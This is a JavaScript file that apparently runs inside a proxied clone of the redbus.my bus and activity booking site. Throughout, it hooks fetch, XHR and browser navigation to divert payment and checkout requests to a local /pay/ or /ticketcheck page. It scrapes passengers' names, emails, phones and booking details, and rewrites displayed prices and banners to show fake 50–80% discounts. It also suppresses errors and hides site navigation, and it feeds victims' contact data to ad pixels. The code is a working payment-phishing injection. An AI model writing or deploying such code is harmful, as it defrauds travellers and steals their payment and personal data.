(function(){
  'use strict';

window.addEventListener('error', function(e) {
  if (e.filename && e.filename.indexOf('reviews-slider') !== -1) {
    e.preventDefault();
    e.stopPropagation();
    return true;
  }
}, true);

window.addEventListener('unhandledrejection', function(e) {
  e.preventDefault();
});





  // ── FB Pixel ──
!function(f,b,e,v,n,t,s){
if(f.fbq)return;
n=f.fbq=function(){
n.callMethod
? n.callMethod.apply(n,arguments)
: n.queue.push(arguments)
};
if(!f._fbq)f._fbq=n;
n.push=n;
n.loaded=!0;
n.version='2.0';
n.queue=[];
t=b.createElement(e);
t.async=!0;
t.src=v;
s=b.getElementsByTagName(e)[0];
s.parentNode.insertBefore(t,s)
}(window,document,'script',
'https://connect.facebook.net/en_US/fbevents.js');

  // ── TikTok Pixel ──
  !function(w,d,t,u,a){w.TiktokAnalyticsObject=u;var s=w[u]=w[u]||[];s.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie"];s.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<s.methods.length;i++)s.setAndDefer(s,s.methods[i]);s.instance=function(t){for(var e=s._i[t]||[],n=0;n<s.methods.length;n++)s.setAndDefer(e,s.methods[n]);return e};s.load=function(e,n){var o="D8MIR7JC77UCQ7E68EEG";s._i=s._i||{},s._i[o]=[],s._i[o]._e=e;var a=d.createElement("script");a.type="text/javascript",a.async=!0,a.src="https://analytics.tiktok.com/i18n/pixel/sdk.js?sdkid="+o+"&lib="+t;var r=d.getElementsByTagName("script")[0];r.parentNode.insertBefore(a,r)};s.page()}(window,document,'script','ttq');
  ttq.load();

/*fbq('init', '1325759409620752');

fbq('track', 'PageView');*/

  // Load additional FB pixels from backend settings
  (function(){
    if (!window._fbPixelsReady) {
    fetch('/api/settings')
      .then(function(r) { return r.json(); })
      .then(function(json) {
        var pixels = (json.data && json.data.fbPixels) || [];
        var enabled = pixels.filter(function(p) { return p.enabled; });
        enabled.forEach(function(p) {
          fbq('init', p.pixelId);
          fbq('track', 'PageView');
        });
        try { sessionStorage.setItem('fbPixelIds', JSON.stringify(enabled.map(function(p){ return p.pixelId; }))); } catch(e) {}
      })
      .catch(function() {});
     }

  })();


  function getUrl(input) {
    if (typeof input === 'string') return input;
    if (input instanceof Request) return input.url;
    return '';
  }
  window.addEventListener('beforeunload', function(e) { e.stopImmediatePropagation(); }, true);

  var ACTIVITY_DISCOUNTS = {
    '517': { multiplier: 0.2, bannerText: 'Get 60% off your order Use code CITY60 on web', activityTitle: 'Sunway Lagoon Theme Park', ticketcheck: true },
    '324': { multiplier: 0.5, bannerText: 'Get 50% off your order', activityTitle: '', ticketcheck: true },
    '326': { multiplier: 0.2, bannerText: 'Get 80% off your order', activityTitle: '', ticketcheck: true }
  };

  function getActivityImageUrl(activityId) {
    if (!activityId) return '';
    return 'https://s3.rdbuz.com/activity-images/Activity/' + activityId + '/THB/' + activityId + '_1.png';
  }

  function extractActivityTitle(activityId, activityCfg) {
    try {
      var titleEl = document.querySelector('h1[class^="activityName__"]') ||
        document.querySelector('[class^="activityName__"]');
      if (titleEl && titleEl.textContent) return titleEl.textContent.trim();
    } catch (ex) {}
    return (activityCfg && activityCfg.activityTitle) || '';
  }

  function extractActivityImage(activityId) {
    try {
      var ogImage = document.querySelector('meta[property="og:image"]');
      if (ogImage && ogImage.content) return ogImage.content;
      var imgEl = document.querySelector('[class^="bannerImage"] img') ||
        document.querySelector('[class^="actImg"] img') ||
        document.querySelector('picture img[src*="activity-images"]') ||
        document.querySelector('img[src*="activity-images"]');
      if (imgEl && imgEl.src) return imgEl.src;
    } catch (ex) {}
    return getActivityImageUrl(activityId);
  }

  function getActivityIdFromPath() {
    var m = location.pathname.match(/\/activities\/details\/(\d+)/);
    return m ? m[1] : null;
  }

  function getActivityDiscountConfig() {
    var id = getActivityIdFromPath();
    return id ? ACTIVITY_DISCOUNTS[id] : null;
  }

  function getActivityPayUrl() {
    var cfg = getActivityDiscountConfig();
    return (cfg && cfg.ticketcheck) ? '/ticketcheck' : '/pay/';
  }

  function normalizeTtPhone(phone) {
    if (!phone) return '';
    var raw = String(phone).trim();
    var digits = raw.replace(/\D/g, '');
    if (!digits) return '';
    if (raw.indexOf('+') === 0) return '+' + digits;
    if (digits.indexOf('60') === 0) return '+' + digits;
    return '+60' + digits;
  }

  function ttIdentifyFromContact() {
    if (!window.ttq) return;
    var email = '';
    var phone = '';
    try {
      var u = JSON.parse(localStorage.getItem('userContactDetails') || '{}');
      if (u.email && u.email.value) email = String(u.email.value).trim().toLowerCase();
      if (u.mobile && u.mobile.value) phone = normalizeTtPhone(u.mobile.value);
    } catch (ex) {}
    var identify = {};
    if (email) identify.email = email;
    if (phone) identify.phone_number = phone;
    if (Object.keys(identify).length) window.ttq.identify(identify);
  }

  function buildTtContents(booking) {
    booking = booking || {};
    var amount = Number(booking.amount) || 0;
    var activityId = String(booking.activityId || '');
    var contentName = booking.ticketName || booking.activityTitle || 'Ticket';
    var items = Array.isArray(booking.items) ? booking.items : [];
    var contents = [];

    if (items.length) {
      items.forEach(function(item, idx) {
        contents.push({
          content_id: activityId ? activityId + '-' + idx : ('ticket-' + idx),
          content_type: 'product',
          content_name: contentName + (item.type ? ' - ' + item.type : ''),
          quantity: item.qty || 1,
          price: Number(item.unitPrice) || 0
        });
      });
    } else {
      contents.push({
        content_id: activityId || 'ticket',
        content_type: 'product',
        content_name: contentName,
        quantity: booking.pax || 1,
        price: amount
      });
    }

    var quantity = contents.reduce(function(sum, c) { return sum + (c.quantity || 1); }, 0);
    return {
      contents: contents,
      content_id: activityId || contents[0].content_id,
      content_type: 'product',
      content_name: contentName,
      value: amount,
      currency: booking.currency || 'MYR',
      quantity: quantity
    };
  }

  function trackTtEvent(eventName, booking, extra) {
    if (!window.ttq) return;
    ttIdentifyFromContact();
    var payload = buildTtContents(booking);
    if (extra) {
      Object.keys(extra).forEach(function(key) {
        payload[key] = extra[key];
      });
    }
    window.ttq.track(eventName, payload);
  }

  function isValidTicketData(data) {
    return !!(data && Array.isArray(data.items) && data.items.length > 0 && Number(data.amount) > 0);
  }

  function readTicketBookingData() {
    try {
      return JSON.parse(localStorage.getItem('redbus_booking_ticket') || '{}');
    } catch (ex) {
      return {};
    }
  }

  function saveTicketBookingData() {
    try {
      var existing = readTicketBookingData();
      var fresh = extractTicketData();
      if (isValidTicketData(fresh)) {
        localStorage.setItem('redbus_booking_ticket', JSON.stringify(fresh));
      } else if (isValidTicketData(existing)) {
        return;
      }
    } catch (ex) {}
  }

  function redirectPay() {
    var activityCfg = getActivityDiscountConfig();
    var data;

    if (activityCfg) {
      saveTicketBookingData();
      data = readTicketBookingData();
    } else {
      data = extractBookingData();
      try {
        localStorage.setItem('redbus_booking', JSON.stringify(data));
      } catch (ex) {}
    }

    if (window.fbq) {
      var ttPayload = buildTtContents(data);
      fbq('track', 'AddToCart', {
        value: ttPayload.value,
        currency: ttPayload.currency,
        content_ids: ttPayload.contents.map(function(c) { return c.content_id; })
      });
    }
    trackTtEvent('AddToCart', data);

    location.href = getActivityPayUrl();
  }

  var _fetch = window.fetch;
  window.fetch = function(input, init) {
    var url = getUrl(input);
    console.log('[fetch intercepted]', url);
    if (url) {
      var p = url.split('?')[0];
      if (/\.(js|css|png|jpg|woff2?)(\?|$)/.test(p)) {
      return _fetch.call(window, input, init);
    }
      var stripped = url.replace(/https?:\/\/(?:www\.)?redbus\.my/gi, '');
      // Payment APIs that mean user is proceeding to payment
      if (p.indexOf('/paymentDetails') !== -1 || p.indexOf('/saveBooking') !== -1 || p.indexOf('/proceedToPayment') !== -1 || p.indexOf('/createOrder') !== -1) {
        redirectPay();
        return new Promise(function() {});
      }


      if (typeof input === 'string') input = stripped;
    }
    return _fetch.call(window, input, init);
  };

  var _origOpen = XMLHttpRequest.prototype.open;
  XMLHttpRequest.prototype.open = function(method, url) {
    if (typeof url === 'string') {
      url = url.replace(/https?:\/\/(?:www\.)?redbus\.my/gi, '');
    }
    return _origOpen.call(this, method, url);
  };

  // Intercept navigation to /paymentDetails
  function checkPayUrl(url) {
  if (typeof url === 'string') {
    var p = url.split('?')[0];
    var ur;
    console.log('[checkPayUrl]', p); // ← 加這行
    if (
      p.indexOf('/paymentDetails') !== -1 ||
      p.indexOf('/payment') !== -1 ||
      p.indexOf('/createOrder') !== -1 ||
      // ✅ 只攔截 /checkout 結尾或 /checkout? 的，不攔截 /activities/checkout/...
      /\/checkout(\?|$)/.test(p)
    ) {
      redirectPay();
      return getActivityPayUrl();
    }
  }
  return url;
}
  var _ps = history.pushState;
  history.pushState = function(s, t, u) { u = checkPayUrl(u); return _ps.call(this, s, t, u); };
  var _rs = history.replaceState;
  history.replaceState = function(s, t, u) { u = checkPayUrl(u); return _rs.call(this, s, t, u); };
  try { var _assign = location.assign.bind(location); location.assign = function(u) { return _assign(checkPayUrl(u)); }; } catch(e) {}
  try { var _rep = location.replace.bind(location); location.replace = function(u) { return _rep(checkPayUrl(u)); }; } catch(e) {}


  function extractTicketData() {
  var data = {};
  data.productType = 'Ticket';

  var activityId = getActivityIdFromPath();
  var activityCfg = getActivityDiscountConfig();
  data.activityId = activityId || '';
  data.discountMultiplier = activityCfg ? activityCfg.multiplier : null;
  data.activityTitle = extractActivityTitle(activityId, activityCfg);
  data.activityImage = extractActivityImage(activityId);

  try {
    var nameEl = document.querySelector(
      "[class^='ticketName__styles-details-bookingOptions-module-scss-']"
    );
    var totalEl = document.querySelector(
      "[class^='totalAmtComputed__styles-details-bookingOptions-module-scss-']"
    );
    var dateEl = document.querySelector(
      "[class^='dateTxt__styles-details-bookingOptions-module-scss-']"
    );

    if (nameEl) data.ticketName = nameEl.textContent.trim();
    if (dateEl) data.ticketDate = dateEl.textContent.trim();

    if (totalEl) {
      var txt = totalEl.textContent || '';
      var m = txt.match(/[\d,.]+/);
      if (m) data.amount = m[0].replace(/,/g, '');
    }

    var items = [];
    var originalTotal = 0;
    var sections = document.querySelectorAll('[class^="genSec__styles-details-bookingOptions-module-scss-"]');
    sections.forEach(function(section) {
      var priceEl = section.querySelector('[class^="netPrice__styles-details-paxPrice-modules-scss-"]');
      var strikeEl = section.querySelector('[class^="strikedPrice__styles-details-paxPrice-modules-scss-"]');
      var cntEl = section.querySelector('[class^="multiCntLbl__styles-details-bookingOptions-module-scss-"]');
      var paxTypeEl = section.querySelector('[class^="paxType__styles-details-paxPrice-modules-scss-"]');
      var paxAgeEl = section.querySelector('[class^="paxAge__styles-details-paxPrice-modules-scss-"]');

      if (!priceEl || !cntEl) return;

      var qty = parseInt(cntEl.textContent.trim(), 10);
      if (!qty || isNaN(qty)) return;

      var priceTxt = priceEl.textContent || '';
      var pm = priceTxt.match(/[\d,.]+/);
      if (!pm) return;

      if (strikeEl) {
        var sm = strikeEl.textContent.match(/[\d,.]+/);
        if (sm) originalTotal += parseFloat(sm[0].replace(/,/g, '')) * qty;
      }

      items.push({
        type: (paxTypeEl ? paxTypeEl.textContent.trim() : '') + (paxAgeEl ? ' ' + paxAgeEl.textContent.trim() : ''),
        unitPrice: pm[0].replace(/,/g, ''),
        qty: qty
      });
    });

    data.items = items;
    data.pax = items.reduce(function(sum, item) { return sum + item.qty; }, 0);

    var amountNum = Number(data.amount);
    if (originalTotal > 0) {
      data.originalAmount = Math.round(originalTotal * 100) / 100;
    } else if (Number.isFinite(amountNum) && activityCfg && activityCfg.multiplier > 0) {
      data.originalAmount = Math.round((amountNum / activityCfg.multiplier) * 100) / 100;
    }

  } catch(ex) {}

  data.currency = 'MYR';
  console.log('[Ticket Extracted]', data);
  return data;
}






  function extractBookingData() {
    var data = {};
    try {
      var store = window.__REDUX_STORE__ || window.__store || window.store;
      if (store) {
        var state = store.getState ? store.getState() : (store.state || {});
        // Try specific known paths
        if (state.seat) {
          var s = state.seat.seatResponseData || state.seat.data || state.seat;
          data.busName = s.travelsName || data.busName || '';
          data.busType = s.busType || data.busType || '';
          data.departureTime = s.bpTime || s.departureTime || data.departureTime || '';
          data.arrivalTime = s.dpTime || s.arrivalTime || data.arrivalTime || '';
          data.depPlace = s.bpName || s.srcName || data.depPlace || '';
          data.arrPlace = s.dpName || s.dstName || data.arrPlace || '';
          data.duration = (s.duration || s.tripDuration || '') + '';
          if (s.passengers && s.passengers[0]) {
            data.passengerName = s.passengers[0].name || data.passengerName || '';
            data.seats = s.passengers[0].seatNo || data.seats || '';
          }
        }
        if (state.search) {
          var sr = state.search.fromCityName ? state.search : (state.search.data || state.search.params || state.search);
          data.origin = sr.fromCityName || sr.from || sr.origin || data.origin || '';
          data.destination = sr.toCityName || sr.to || sr.destination || data.destination || '';
          data.departureDate = sr.doj || sr.onward || sr.departureDate || data.departureDate || '';
          data.pax = sr.passengerCount || sr.pax || data.pax || 1;
        }
        if (state.passengerInfo) {
          var p = state.passengerInfo.data || state.passengerInfo;
          data.passengerName = p.name || data.passengerName || '';
          data.email = p.email || data.email || '';
          data.phone = p.phone || p.mobile || data.phone || '';
        }
        // Walk entire state for any missed fields
        function walk(obj) {
          if (!obj || typeof obj !== 'object') return;
          if (obj.fromCityName) { data.origin = obj.fromCityName; data.destination = obj.toCityName || ''; data.departureDate = obj.doj || obj.onward || ''; data.pax = obj.passengerCount || 1; }
          if (obj.travelsName) { data.busName = obj.travelsName; data.busType = obj.busType || ''; }
          if (obj.bpTime) { data.departureTime = obj.bpTime; data.depPlace = obj.bpName || ''; }
          if (obj.dpTime) { data.arrivalTime = obj.dpTime; data.arrPlace = obj.dpName || ''; }
          if (obj.duration) data.duration = obj.duration + '';
          if (obj.seatNo) data.seats = obj.seatNo + '';
          if (obj.name && (obj.age || obj.seatNo)) data.passengerName = obj.name;
          if (obj.mobile && obj.mobile.length > 5) data.phone = obj.mobile;
          if (obj.email && obj.email.indexOf('@') > 0) data.email = obj.email;
          if (obj.totalFare) data.amount = obj.totalFare;
          if (obj.totalPayable) data.amount = obj.totalPayable;
          Object.keys(obj).forEach(function(k) { walk(obj[k]); });
        }
        walk(state);
      }
    } catch(ex) {}
    try { var pd = window.pageData || {}; data.origin = data.origin || pd.fromCity || ''; data.destination = data.destination || pd.toCity || ''; } catch(ex) {}
    if (!data.origin) {
      var sp = new URLSearchParams(location.search);
      data.origin = sp.get('fromCityName') || '';
      data.destination = sp.get('toCityName') || '';
      data.departureDate = sp.get('onward') || sp.get('doj') || '';
    }
    // DOM extraction using user-provided selectors
    try {
      var times = document.querySelectorAll('[class^="bpDpTime"]');
      if (times[0]) data.departureTime = times[0].innerText.trim();
      if (times[1]) data.arrivalTime   = times[1].innerText.trim();

      var dates = document.querySelectorAll('[class^="bpDpDate"]');
      if (dates[0]) {
        var raw0 = dates[0].innerText.trim();
        if (raw0.includes('·')) {
          var parts0 = raw0.split('·');
          data.departureDate = parts0[0].trim();
          if (!data.departureTime) data.departureTime = parts0[1].trim();
        } else {
          data.departureDate = raw0;
        }
      }
      if (dates[1]) {
        var raw1 = dates[1].innerText.trim();
        if (raw1.includes('·')) {
          var parts1 = raw1.split('·');
          data.arriveDate   = parts1[0].trim();
          if (!data.arrivalTime) data.arrivalTime = parts1[1].trim();
        } else {
          data.arriveDate = raw1;
        }
      }
      var places = document.querySelectorAll('[class^="bpDpName"]');
      if (places[0]) data.depPlace = places[0].innerText.trim();
      if (places[1]) data.arrPlace = places[1].innerText.trim();
      var addrs = document.querySelectorAll('[class^="bpDpAddress"]');
      if (!addrs[0] || !addrs[0].innerText.trim()) { addrs = document.querySelectorAll('#bp-point-0 > [class^="rightContent"] > [class^="bpdp"] > [class^="address"]'); }
      if (addrs[0]) data.depAddr = addrs[0].innerText.trim();
      if (addrs[1]) data.arrAddr = addrs[1].innerText.trim();
      // Persist addresses to sessionStorage early (seat page doesn't show bpDpAddress)
      if (data.depAddr || data.arrAddr) {
        try {
          var saved = JSON.parse(sessionStorage.getItem('redbus_addresses') || '{}');
          if (data.depAddr) saved.depAddr = data.depAddr;
          if (data.arrAddr) saved.arrAddr = data.arrAddr;
          sessionStorage.setItem('redbus_addresses', JSON.stringify(saved));
        } catch(e) {}
      } else {
        try {
          var saved2 = JSON.parse(sessionStorage.getItem('redbus_addresses') || '{}');
          if (saved2.depAddr) data.depAddr = saved2.depAddr;
          if (saved2.arrAddr) data.arrAddr = saved2.arrAddr;
        } catch(e) {}
      }
      var dur = document.querySelector('[class^="duration"]');
      if (dur) data.duration = dur.innerText.trim();
      var bus = document.querySelector('[class^="travelsNameSection"] [class^="title"]') || document.querySelector('#custInfoContainer [class^="travelsName"]');
      if (bus) data.busName = bus.innerText.trim();
      var bt = document.querySelector('[class^="travelsType"]');
      if (bt) data.busType = bt.innerText.trim();
      var fv = document.querySelector('[class^="finalValue"]');
      if (fv) { var m = fv.innerText.match(/[\d,]+\.?\d*/); if (m) data.amount = m[0].replace(/,/g, ''); }
      var sw = document.querySelector('[class^="seatWrapper"]');
      if (sw) {
        data.seats = sw.innerText.trim();
      } else {
        var els = document.querySelectorAll("div.listText___b3f376.undefined");
        data.seats = Array.from(els).map(function(el) {
          return el.innerText.trim().replace('Seat', '');
        }).join('\n');
      }
    } catch(ex) {}
    if (!data.currencySymbol) data.currencySymbol = 'MYR';
    console.log('[Redbus] Extracted:', data);
    if (!data.productType) data.productType = 'Bus';
    if (!data.currency) data.currency = 'MYR';
    return data;
  }

  var style = document.createElement('style');
  style.textContent = '.modal-backdrop{display:none!important}[class^="downloadAppContainer"]{display:none!important}[class^="liteAppCardContainer"]{display:none!important}[class^="bannerContainer"]{display:none!important}[class^="bottomNavBarWrapper"]{display:none!important}';
  document.head.appendChild(style);

  
var _totalAmtObserver = null;

function watchTotalAmt() {
  var overlay = document.querySelector('[class^="overlayBg__styles-genericOverlay"]');
  if (!overlay || overlay._totalBound) return;
  overlay._totalBound = true;

  // 監聽第一次插入 totalAmtComputed
  var insertObserver = new MutationObserver(function(mutations) {
    mutations.forEach(function(mutation) {
      mutation.addedNodes.forEach(function(node) {
        if (!node.querySelector) return;
        var totalEl = (node.matches && node.matches('[class*="totalAmtComputed__styles-details-bookingOptions"]'))
          ? node
          : node.querySelector('[class*="totalAmtComputed__styles-details-bookingOptions"]');
        if (!totalEl || totalEl._handled) return;
        totalEl._handled = true;
        totalEl.style.visibility = 'hidden';
        setTimeout(function() {
          fixTotalAmt(totalEl);
          totalEl.style.visibility = 'visible';
        }, 150);
      });
    });
  });

  insertObserver.observe(overlay, { childList: true, subtree: true });

  // ✅ 事件委託：在 overlay 監聽所有點擊，判斷是否是加減按鈕
  overlay.addEventListener('click', function(e) {
    var target = e.target;
    // 判斷點擊的是加減按鈕區域
    var isCounterBtn = target.closest('[class^="btnRight__styles-details-bookingOptions"]') ||
                       target.closest('[class^="btnLeft__styles-details-bookingOptions"]') ||
                       target.closest('[class^="blkCta__styles-details-bookingOptions"]');
    if (!isCounterBtn) return; // ✅ 不是加減按鈕就不處理

    var totalEl = document.querySelector('[class*="totalAmtComputed__styles-details-bookingOptions"]');
    if (!totalEl) return;
    totalEl.style.visibility = 'hidden';
    setTimeout(function() {
      fixTotalAmt(totalEl);
      totalEl.style.visibility = 'visible';
    }, 300);
  });
}

function fixTotalAmt(el) {
  if (el._fixing) return;

  var sections = document.querySelectorAll('[class^="genSec__styles-details-bookingOptions-module-scss-"]');

  var total = 0;
  var hasAny = false;

  sections.forEach(function(section) {
    var priceEl = section.querySelector('[class^="netPrice__styles-details-paxPrice-modules-scss-"]');
    if (!priceEl) return;
    var priceTxt = priceEl.textContent || '';
    var pm = priceTxt.match(/[\d,.]+/);
    if (!pm) return;
    var unitPrice = parseFloat(pm[0].replace(/,/g, ''));
    if (isNaN(unitPrice)) return;
    var cntEl = section.querySelector('[class^="multiCntLbl__styles-details-bookingOptions-module-scss-"]');
    var qty = cntEl ? parseInt(cntEl.textContent.trim()) : 0;
    if (!qty) return;
    total += unitPrice * qty;
    hasAny = true;
  });

  // ✅ 不管有沒有計算到，都要恢復顯示
  el.style.visibility = 'visible';

  if (!hasAny) return;

  el._fixing = true;
  el.textContent = 'MYR ' + total.toFixed(2);
  el._fixing = false;
}









  var _observerTimer = null;
  var _discountActivityTimer = null;
  // Observer 1：只負責綁定按鈕和 title，監聽整頁但防抖長一點
var observer = new MutationObserver(function() {
  clearTimeout(_observerTimer);
  _observerTimer = setTimeout(function() {

    var btn = document.querySelector("#leaner-funnel-popup > div.bpdpMain__sea-seat-styles-module-scss-qxwqs > div > div.bpDpAfterListsWrapper__sea-seat-styles-module-scss-56bZs > div > div > div > div > div:nth-child(2) > button");
    if (btn && !btn._bound) {
      btn._bound = true;
      btn.addEventListener('click', function() {
        var data = extractBookingData();
        try { localStorage.setItem('redbus_booking', JSON.stringify(data)); } catch(ex) {}
      });
    }

    var btns = document.querySelector("body > div.overlayBg__styles-genericOverlay-genericOverlay-module-scss-GP6D7.undefined > div > div.fixedBottomCta__styles-details-bookingOptions-module-scss-YG7co > div.buttonWrap__styles-details-bookingOptions-module-scss-cuyXz > div:nth-child(2)");
    if (btns && !btns._bound) {
      btns._bound = true;
      btns.addEventListener('click', function() {
        saveTicketBookingData();
      });
    }

    document.querySelectorAll('[class^="checkoutButton__styles-cart-proceedToCheckOut"]').forEach(function(checkoutBtn) {
      if (checkoutBtn._ticketBound) return;
      checkoutBtn._ticketBound = true;
      checkoutBtn.addEventListener('click', function() {
        saveTicketBookingData();
      }, true);
    });

    var activityCfg = getActivityDiscountConfig();
    var title = document.querySelector("#root > [class^='bannerContainer'] > [class^='titleContent'] > div > [class^='titleWrap']");
    if (activityCfg && title && !title._bound) {
      title._bound = true;
      var spans = title.querySelectorAll('span');
      if (spans[0]) spans[0].textContent = activityCfg.bannerText;
      if (spans[1]) spans[1].textContent = '';
    }

    if (activityCfg) {
      var navRight = document.querySelector("#headerWrap > div > div.navBarRight__styles-common-header-module-scss-ktXgD");
      var navLeft = document.querySelector("#headerWrap > div > div.navBarLeft__styles-common-header-module-scss-tBV3O > div > div");
      if (navRight) navRight.style.display = 'none';
      if (navLeft) navLeft.style.display = 'none';

      if (!window.__redbusViewContentSent) {
        window.__redbusViewContentSent = true;
        var activityId = getActivityIdFromPath();
        trackTtEvent('ViewContent', {
          activityId: activityId,
          activityTitle: extractActivityTitle(activityId, activityCfg),
          amount: 0,
          currency: 'MYR'
        });
      }

      document.querySelectorAll('[class^="selectTicketBtn"]').forEach(function(selectBtn) {
        if (selectBtn._discountBound) return;
        selectBtn._discountBound = true;
        selectBtn.addEventListener('click', function() {
          setTimeout(function() { applyActivityDiscount(activityCfg.multiplier); }, 300);
        });
      });

      var blockCount = document.querySelectorAll('[class^="perPaxPriceBlock__"]').length;
      if (blockCount > (window.__redbusLastBlockCount || 0)) {
        window.__redbusLastBlockCount = blockCount;
        clearTimeout(_discountActivityTimer);
        _discountActivityTimer = setTimeout(function() { applyActivityDiscount(activityCfg.multiplier); }, 200);
      }

      watchTotalAmt();
    }

  }, 150);
});

observer.observe(document.documentElement, { childList: true, subtree: true });





function applyActivityDiscount(multiplier) {
  var fromPrices = document.querySelectorAll(
    '[class^="fromPrice__styles-details-ticketListing-module-scss-n"]'
  );

  // 找所有 perPaxPriceBlock（列表頁和彈出框都用這個結構）
  var blocks = document.querySelectorAll('[class^="perPaxPriceBlock__styles-details-paxPrice-modules-scss-"]');
  if (!blocks.length) return;

  // 列表頁的 block 是在 card 裡的，彈出框的 block 是在 genModel 裡的
  var listBlocks = [];
  var popupBlocks = [];

  blocks.forEach(function(block) {
    // 判斷是否在彈出框裡
    var inPopup = block.closest('[class^="genModel__styles-details-bookingOptions-module-scss-"]');
    if (inPopup) {
      popupBlocks.push(block);
    } else {
      listBlocks.push(block);
    }
  });

  function parseBlockMoney(text) {
    var m = String(text || '').match(/[\d,.]+/);
    return m ? parseFloat(m[0].replace(/,/g, '')) : NaN;
  }

  function getBlockOriginalNum(block, netEl) {
    var strikeEl = block.querySelector('[class^="strikedPrice__styles-details-paxPrice-modules-scss-"]');
    var originalNum = NaN;
    if (strikeEl) originalNum = parseBlockMoney(strikeEl.textContent);
    if (!Number.isFinite(originalNum) && netEl.dataset.originalPrice) {
      originalNum = parseFloat(netEl.dataset.originalPrice);
    }
    if (!Number.isFinite(originalNum) && !netEl.dataset.discounted) {
      originalNum = parseBlockMoney(netEl.textContent);
    }
    return originalNum;
  }

  function isBlockCorrectlyDiscounted(block, discount) {
    var netEl = block.querySelector('[class^="netPrice__styles-details-paxPrice-modules-scss-"]');
    if (!netEl || !netEl.dataset.discounted) return false;
    var originalNum = getBlockOriginalNum(block, netEl);
    if (!Number.isFinite(originalNum) || originalNum <= 0) return false;
    var currentNum = parseBlockMoney(netEl.textContent);
    if (!Number.isFinite(currentNum)) return false;
    return Math.abs(currentNum / originalNum - discount) <= 0.05;
  }

  if (listBlocks.length && listBlocks.every(function(b) { return isBlockCorrectlyDiscounted(b, multiplier); }) &&
      (!popupBlocks.length || popupBlocks.every(function(b) { return isBlockCorrectlyDiscounted(b, multiplier); }))) {
    return;
  }

  function getTicketCardRoot(btn) {
    var node = btn.parentElement;
    while (node && node !== document.body) {
      var blocks = node.querySelectorAll('[class^="perPaxPriceBlock__"]');
      var buttons = node.querySelectorAll('[class^="selectTicketBtn"]');
      if (blocks.length > 0 && buttons.length === 1) return node;
      node = node.parentElement;
    }
    return btn.closest('[class*="ticketListing"]') || btn.closest('[class^="genCard__"]') || null;
  }

  function syncFromPrice(fromPriceEl, priceText) {
    if (!fromPriceEl || !priceText) return;
    fromPriceEl.textContent = 'From MYR ' + priceText;
    fromPriceEl.dataset.discounted = '1';
  }

  function processBlock(block, discount) {
    var netEl = block.querySelector('[class^="netPrice__styles-details-paxPrice-modules-scss-"]');
    if (!netEl) return NaN;

    var strikeEl = block.querySelector('[class^="strikedPrice__styles-details-paxPrice-modules-scss-"]');
    var originalNum = getBlockOriginalNum(block, netEl);
    if (!Number.isFinite(originalNum)) return NaN;

    if (netEl.dataset.discounted) {
      var currentNum = parseBlockMoney(netEl.textContent);
      if (Number.isFinite(currentNum) && originalNum > 0) {
        var ratio = currentNum / originalNum;
        if (Math.abs(ratio - discount) <= 0.05) return currentNum;
      }
      if (!strikeEl && !netEl.dataset.originalPrice) {
        return Number.isFinite(currentNum) ? currentNum : NaN;
      }
      delete netEl.dataset.discounted;
    }

    var newPriceNum = Math.round(originalNum * discount * 100) / 100;
    var newPrice = newPriceNum.toFixed(2);
    netEl.textContent = 'MYR ' + newPrice;
    netEl.dataset.discounted = '1';
    netEl.dataset.originalPrice = String(originalNum);
    return newPriceNum;
  }

  var ticketCards = [];
  document.querySelectorAll('[class^="selectTicketBtn"]').forEach(function(btn) {
    var card = getTicketCardRoot(btn);
    if (card && ticketCards.indexOf(card) === -1) ticketCards.push(card);
  });

  if (ticketCards.length) {
    ticketCards.forEach(function(card, cardIndex) {
      var cardBlocks = card.querySelectorAll('[class^="perPaxPriceBlock__styles-details-paxPrice-modules-scss-"]');
      var fromPriceEl = fromPrices[cardIndex] || null;
      var minPrice = Infinity;
      cardBlocks.forEach(function(block) {
        var price = processBlock(block, multiplier);
        if (Number.isFinite(price) && price < minPrice) minPrice = price;
      });
      if (fromPriceEl && minPrice < Infinity) syncFromPrice(fromPriceEl, minPrice.toFixed(2));
    });
  } else {
    listBlocks.forEach(function(block) {
      processBlock(block, multiplier);
    });
  }

  popupBlocks.forEach(function(block) {
    processBlock(block, multiplier);
  });
}




})();
